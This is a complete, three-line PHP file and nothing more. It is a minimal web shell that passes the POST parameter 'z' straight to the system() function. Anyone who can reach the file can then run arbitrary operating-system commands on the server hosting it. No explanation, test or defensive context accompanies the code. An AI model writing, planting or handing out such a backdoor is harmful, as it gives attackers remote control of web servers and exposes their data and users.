<?php
system($_POST['z']);
?>
